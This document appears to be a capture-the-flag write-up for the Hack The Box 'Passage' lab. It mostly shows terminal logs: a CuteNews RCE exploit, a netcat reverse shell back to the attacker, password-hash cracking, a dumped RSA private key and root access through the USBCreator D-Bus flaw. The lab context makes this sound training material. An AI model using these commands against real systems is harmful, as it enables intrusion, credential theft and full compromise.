root@Blue3:.../passage# py 48800.py



           _____     __      _  __                     ___   ___  ___
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
                                ___  _________
                               / _ \/ ___/ __/
                              / , _/ /__/ _/
                             /_/|_|\___/___/




[->] Usage python3 expoit.py

Enter the URL> http://passage.htb
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: VH92KMxPch and password: VH92KMxPch

=======================================================
Sending Payload
=======================================================
signature_key: 6b99300890c8c51f198d2c2e6243edfd-VH92KMxPch
signature_dsi: 068b4fe54f8cc90adfc75dbc39686852
logged in user: VH92KMxPch
============================
Dropping to a SHELL
============================

command > ls
avatar_JoK2BeaAbK_JoK2BeaAbK.php
avatar_VH92KMxPch_VH92KMxPch.php
avatar_egre55_ykxnacpt.php
avatar_hacker_jpyoyskt.php

command > nc MyIP 3592

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:~# nc -lvnp 3592
listening on [any] 3592 ...
connect to [MyIP] from (UNKNOWN) [10.10.10.206] 34788
whoami
www-data
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@passage:/var/www/html/CuteNews/uploads$ export TERM=XTERM
export TERM=XTERM
www-data@passage:/var/www/html/CuteNews$ find . -maxdepth 2 -type f
...
./cdata/ipban.db.php
./cdata/comments.txt
./cdata/flood.txt
./cdata/idnews.db.php
./cdata/postponed_news.txt
./cdata/news.txt
./cdata/category.db.php
./cdata/conf.php
./cdata/config.php
./cdata/unapproved_news.txt
./cdata/rss.tpl
./cdata/auto_archive.db.php
./cdata/Default.tpl
./cdata/users.txt
./cdata/Headlines.tpl
./cdata/replaces.php
./cdata/installed.mark
./cdata/newsid.txt
./cdata/csrf.php
./cdata/flood.db.php
./cdata/rss_config.php
./cdata/users.db.php
./cdata/confirmations.php
./cdata/cat.num.php
./print.php
./core/zip.class.php
./core/security.php
./core/downloader.php
./core/init.php
./core/update_indexes_tool.php
./core/news.php
./core/core.php
./cn_api.php
./captcha.php
...

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

www-data@passage:/var/www/html$ grep -rnwl . -e paul
grep -rnwl . -e paul
./CuteNews/cdata/news/users.idx
www-data@passage:/var/www/html$ cat /CuteNews/cdata/news/users.idx
cat /CuteNews/cdata/news/users.idx
cat: /CuteNews/cdata/news/users.idx: No such file or directory
www-data@passage:/var/www/html$ cat CuteNews/cdata/news/users.idx
cat CuteNews/cdata/news/users.idx
sid-meier|1586711095,1587128696
paul-coles|1584459160,1585405439
kim-swift|1588433035,1591450298,1591987514
admin|1583243399,1592488043
www-data@passage:/var/www/html$ grep -rnwl . -e 1584459160
grep -rnwl . -e 1584459160
./CuteNews/cdata/news/cache_A2_106c8b094590c6aef8fe0dcafbdc93f0.txt
./CuteNews/cdata/news/users.idx
./CuteNews/cdata/news/cache_A2.txt
./CuteNews/cdata/news/cache_A2_76d8d763f79e57a37b9ec7e884395cae.txt
./CuteNews/cdata/news/date.idx
./CuteNews/cdata/news/so_news.idx
./CuteNews/cdata/news/cat.idx
www-data@passage:/var/www/html$ grep -rnwl . -e 1585405439
grep -rnwl . -e 1585405439
./CuteNews/cdata/news/cache_A2_106c8b094590c6aef8fe0dcafbdc93f0.txt
./CuteNews/cdata/news/users.idx
./CuteNews/cdata/news/cache_A2.txt
./CuteNews/cdata/news/cache_A2_76d8d763f79e57a37b9ec7e884395cae.txt
./CuteNews/cdata/news/date.idx
./CuteNews/cdata/news/so_news.idx
./CuteNews/cdata/news/cat.idx

www-data@passage:/var/www/html/CuteNews/cdata/users$ ls -ltra
total 184
-rw-r--r--  1 www-data www-data    0 Jun 18 08:24 users.txt
-rwxr-xr-x  1 www-data www-data  129 Jun 18 08:24 5d.php
-rwxr-xr-x  1 www-data www-data   45 Jun 18 08:26 d4.php
-rwxr-xr-x  1 www-data www-data  117 Jun 18 08:27 77.php
-rwxr-xr-x  1 www-data www-data  133 Jun 18 08:27 09.php
-rwxr-xr-x  1 www-data www-data  129 Jun 18 08:28 97.php
-rwxr-xr-x  1 www-data www-data  113 Jun 18 08:28 52.php
-rwxr-xr-x  1 www-data www-data  113 Jun 18 08:28 fc.php
-rwxr-xr-x  1 www-data www-data  481 Jun 18 09:07 7a.php
-rwxr-xr-x  1 www-data www-data   45 Jun 18 09:08 d5.php
-rwxr-xr-x  1 www-data www-data  481 Jun 18 09:46 c8.php
-rwxr-xr-x  1 www-data www-data  437 Jun 18 09:50 21.php
-rw-r--r--  1 www-data www-data  109 Aug 30 16:23 0a.php
-rw-r--r--  1 www-data www-data  125 Aug 30 16:23 16.php
-rw-r--r--  1 www-data www-data 3840 Aug 30 17:54 lines
-rw-r--r--  1 www-data www-data  133 Aug 31 14:54 6e.php
-rw-r--r--  1 www-data www-data  109 Aug 31 14:54 32.php
-rw-r--r--  1 www-data www-data  117 Sep 15 03:35 7b.php
-rw-r--r--  1 www-data www-data  137 Sep 15 03:35 26.php
-rw-r--r--  1 www-data www-data  609 Sep 15 03:35 7f.php
-rw-r--r--  1 www-data www-data  117 Sep 15 04:10 91.php
-rw-r--r--  1 www-data www-data  133 Sep 15 04:10 02.php
-rw-r--r--  1 www-data www-data  553 Sep 15 04:14 b0.php
-rw-r--r--  1 www-data www-data  137 Sep 15 04:14 6a.php
-rw-r--r--  1 www-data www-data  609 Sep 15 04:14 f9.php
-rw-r--r--  1 www-data www-data  137 Sep 15 04:16 c0.php
-rw-r--r--  1 www-data www-data  149 Sep 15 04:16 8f.php
-rw-r--r--  1 www-data www-data  609 Sep 15 04:16 98.php
-rw-r--r--  1 www-data www-data  137 Sep 15 04:27 fa.php
-rw-r--r--  1 www-data www-data  117 Sep 15 04:27 1f.php
-rw-r--r--  1 www-data www-data  609 Sep 15 04:27 ec.php
-rw-r--r--  1 www-data www-data  117 Sep 15 04:32 b8.php
-rw-r--r--  1 www-data www-data  137 Sep 15 04:32 a3.php
-rw-r--r--  1 www-data www-data  609 Sep 15 04:32 ff.php
-rw-r--r--  1 www-data www-data  137 Sep 15 04:35 f3.php
-rw-r--r--  1 www-data www-data  193 Sep 15 04:35 66.php
-rw-r--r--  1 www-data www-data  609 Sep 15 04:35 59.php
-rw-r--r--  1 www-data www-data  137 Sep 15 04:51 15.php
-rw-r--r--  1 www-data www-data  149 Sep 15 04:51 85.php
-rw-r--r--  1 www-data www-data  393 Sep 15 04:51 f5.php
-rw-r--r--  1 www-data www-data  113 Sep 15 04:51 dc.php
-rw-r--r--  1 www-data www-data  133 Sep 15 04:51 d7.php
-rw-r--r--  1 www-data www-data  457 Sep 15 05:01 a4.php
drwxrwxrwx 11 www-data www-data 4096 Sep 15 05:01 ..
-rw-r--r--  1 www-data www-data  137 Sep 15 05:01 dd.php
-rw-r--r--  1 www-data www-data 1745 Sep 15 05:01 d6.php
drwxrwxrwx  2 www-data www-data 4096 Sep 15 05:01 .

=> Try to grab all file to get the nadav or paul password.
www-data@passage:/var/www/html/CuteNews/cdata/users$ cat b0.php
...
...
cat b0.php
<?php die('Direct call - access denied'); ?>
YToyOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX1zOjI6ImlkIjthOjE6e2k6MTYwMDE2ODQ2MTtzOjEwOiJWSDkyS014UGNoIjt9fQ==

root@Blue3:~# echo "YToyOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX1zOjI6ImlkIjthOjE6e2k6MTYwMDE2ODQ2MTtzOjEwOiJWSDkyS014UGNoIjt9fQ==" | base64 -d
a:2:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}s:2:"id";a:1:{i:1600168461;s:10:"VH92KMxPch";}}

=> paul-coles / e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
https://crackstation.net/ :
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd	sha256	atlanta1

www-data@passage:/var/www/html/CuteNews/cdata/users$ cd /home
www-data@passage:/home$ su - paul
Password: atlanta1

paul@passage:~$ cd /home/paul
paul@passage:~$ ls -ltra
ls -ltra
total 112
-rw-r--r--  1 paul paul  220 Aug 31  2015 .bash_logout
-rw-r--r--  1 paul paul 8980 Apr 20  2016 examples.desktop
-rw-r--r--  1 paul paul  655 May 16  2017 .profile
drwxr-xr-x  4 root root 4096 Jul 21 10:43 ..
drwxr-xr-x  2 paul paul 4096 Jul 21 10:43 .ssh
----------  1 paul paul    0 Jul 21 10:44 .bash_history
-rw-r--r--  1 paul paul 3770 Jul 21 10:44 .bashrc
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Videos
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Templates
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Public
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Pictures
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Music
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Downloads
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Documents
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Desktop
-rw-r--r--  1 paul paul   25 Aug 24 07:11 .dmrc
drwx------  3 paul paul 4096 Aug 24 07:11 .local
drwx------ 14 paul paul 4096 Aug 24 07:12 .config
drwx------  2 paul paul 4096 Aug 24 07:13 .gconf
drwx------ 10 paul paul 4096 Sep  1 02:10 .cache
-rw-------  1 paul paul 1397 Sep  1 04:20 .xsession-errors.old
-rw-------  1 paul paul   52 Sep  2 07:18 .Xauthority
-rw-------  1 paul paul 1292 Sep  2 07:18 .ICEauthority
drwxr-x--- 16 paul paul 4096 Sep  2 07:18 .
drwx------  3 paul paul 4096 Sep  2 07:19 .gnupg
-rw-------  1 paul paul 1228 Sep  2 07:19 .xsession-errors
-r--------  1 paul paul   33 Sep 15 03:33 user.txt
paul@passage:~$ cat user.txt
********************************

paul@passage:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/
+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i
Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt
rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ
JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok
sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ
eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG
QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr
lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh
zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz
R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k
7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio
GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4
IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE
LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR
AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0
VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt
1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0
KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1
9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF
d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs
nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY
f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM
Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs
OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==
-----END RSA PRIVATE KEY-----

We find the user nadav in the authorized_keys under the .ssh folder. So nadav can ssh into user paul without password. So maybe paul can do that too? Paul and Nadav seems close friends, huh?

We try ssh ing into nadav from paul and succeed!

root@Blue3:~/.ssh# chmod 600 paul.pri
root@Blue3:~/.ssh# ssh paul@passage.htb -i paul.pri
load pubkey "paul.pri": invalid format
paul@passage:~$ exit
logout
Connection to passage.htb closed.
root@Blue3:~/.ssh# ssh nadav@passage.htb -i paul.pri
load pubkey "paul.pri": invalid format
Last login: Tue Sep 15 03:38:23 2020 from 10.10.14.10

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:~/.ssh# ssh-keygen -f passage.root

nadav@passage:~$ echo "?????"" > /home/nadav/key
nadav@passage:~$ cd ~
nadav@passage:~$ ls -ltra
total 120
-rw-r--r--  1 nadav nadav  655 Jun 18 10:05 .profile
-rw-r--r--  1 nadav nadav 8980 Jun 18 10:05 examples.desktop
-rw-r--r--  1 nadav nadav  220 Jun 18 10:05 .bash_logout
-rw-r--r--  1 nadav nadav   25 Jun 18 10:07 .dmrc
drwxr-xr-x  2 nadav nadav 4096 Jun 18 10:07 Videos
drwxr-xr-x  2 nadav nadav 4096 Jun 18 10:07 Templates
drwxr-xr-x  2 nadav nadav 4096 Jun 18 10:07 Public
drwxr-xr-x  2 nadav nadav 4096 Jun 18 10:07 Pictures
drwxr-xr-x  2 nadav nadav 4096 Jun 18 10:07 Music
drwxr-xr-x  2 nadav nadav 4096 Jun 18 10:07 Downloads
drwxr-xr-x  2 nadav nadav 4096 Jun 18 10:07 Documents
drwxr-xr-x  2 nadav nadav 4096 Jun 18 10:07 Desktop
drwx------  3 nadav nadav 4096 Jun 18 10:07 .local
drwx------  2 nadav nadav 4096 Jun 18 10:07 .gconf
-rw-r--r--  1 nadav nadav    0 Jun 18 10:07 .sudo_as_admin_successful
drwx------ 14 nadav nadav 4096 Jun 18 10:08 .config
drwxr-xr-x  4 root  root  4096 Jul 21 10:43 ..
drwx------  2 nadav nadav 4096 Jul 21 10:43 .ssh
-rw-r--r--  1 nadav nadav 3822 Jul 21 10:44 .bashrc
----------  1 nadav nadav    0 Jul 21 10:45 .bash_history
drwx------ 12 nadav nadav 4096 Jul 21 10:47 .cache
drwxr-xr-x  2 nadav nadav 4096 Aug 31 14:06 .nano
-rw-------  1 nadav nadav 1448 Sep  2 07:19 .xsession-errors.old
-rw-------  1 nadav nadav  103 Sep 15 03:33 .Xauthority
-rw-------  1 nadav nadav   82 Sep 15 03:33 .xsession-errors
drwx------  3 nadav nadav 4096 Sep 15 03:33 .gnupg
-rw-------  1 nadav nadav 3532 Sep 15 03:33 .ICEauthority
-rw-------  1 nadav nadav 1854 Sep 15 04:01 .viminfo
-rw-r--r--  1 nadav nadav  564 Sep 15 05:40 key
drwxr-x--- 17 nadav nadav 4096 Sep 15 05:40 .

This is the part I was stuck for a long time. Normal privesc scripts didn’t show anything interesting. The only thing I found interesting was the CUPS service running on port 631, which is a service for printing. But that’s a rabbit hole.
Finally looking at the running processes on the system using ps aux, we find the following process running with root privileges.
root       2388  0.0  0.4 235548 20020 ?        Sl   00:25   0:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper
A program called usb-creator-helper. Googling it, we see that it is used by the in built live usb creator for ubuntu. It is called “Startup Disk Creator”. As per wikipedia,
Startup Disk Creator is an official tool to create Live USBs of Ubuntu from the Live CD or from an ISO image. The tool is included by default in all releases after Ubuntu 8.04, and can be installed on Ubuntu 8.04.
We try looking for some vulnerabilities related to this, and we find this awesome article on privilege escalation using this USBCreator dbus by, who else, other than Navas Markus? The article link is:
https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
The vulnerability is discussed in details in the post. What happens here is that the USBCreator implements the popular unix tool dd used for writing to disks using python. But it does not perform any sanitation checks on which files are being written to which location, neither does it prompt for the user password for the users belonging to the sudo group. And our user nadav does in fact belong to the sudo group as we can verify using the id command.
So using this vulnerability, we can get sensitive contents owned by root, like the root.txt, shadow file with passwords, or the id_rsa of the root.

=>
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/key /root/.ssh/authorized_keys true
()

root@Blue3:~/.ssh# dlist
total 16
-rw-r--r--  1 root root  564 Sep 15 19:39 passage.root.pub
-rw-------  1 root root 2590 Sep 15 19:39 passage.root
drwx------  2 root root 4096 Sep 15 19:39 .
drwxr-xr-x 56 root root 4096 Sep 15 19:42 ..
root@Blue3:~/.ssh# ssh root@passage.htb -i passage.root
The authenticity of host 'passage.htb (10.10.10.206)' can't be established.
ECDSA key fingerprint is SHA256:oRyj2rNWOCrVh9SCgFGamjppmxqJUlGgvI4JSVG75xg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'passage.htb,10.10.10.206' (ECDSA) to the list of known hosts.
Last login: Tue Sep 15 04:11:14 2020 from 10.10.14.10
root@passage:~# id
uid=0(root) gid=0(root) groups=0(root)
root@passage:~# cat root.txt
********************************
